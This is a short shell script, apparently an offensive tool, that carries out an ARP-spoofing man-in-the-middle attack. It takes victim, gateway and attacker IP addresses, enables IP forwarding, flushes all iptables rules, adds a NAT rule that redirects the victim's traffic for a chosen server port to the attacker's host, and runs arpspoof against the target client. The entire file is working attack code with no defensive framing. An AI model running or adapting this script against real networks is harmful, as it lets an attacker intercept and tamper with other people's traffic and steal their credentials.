#!/bin/sh

checkArgs() {

	if [ $# -lt 5 ]; then
	  echo 1>&2 "[-] Usage: $0 targetserverip targetclientip port gatewayip attackerip"
	  exit 1
	fi

	return 1
}

startSpoof() {

	TARGETSERVER=$1
	TARGETCLIENT=$2
	PORT=$3
	GATEWAY=$4
	ATTACKER=$5

	printf "[+] Enabling IP Forwarding\n"
	echo 1 > /proc/sys/net/ipv4/ip_forward

	printf "[+] Flushing IP Tables\n"
	iptables -F
	iptables -t nat -F
	iptables -X

	printf "[+] Enabling IP Table PREROUTING\n"
	iptables -t nat -A PREROUTING -p tcp -d $TARGETSERVER \
	--dport $PORT -j DNAT --to-destination $ATTACKER:$PORT

	printf "[+] Enabling ARP Spoofing \n"
	arpspoof -i eth0 -t $TARGETCLIENT $GATEWAY 

	return 0
}

checkArgs $1 $2 $3 $4 $5
startSpoof $1 $2 $3 $4 $5
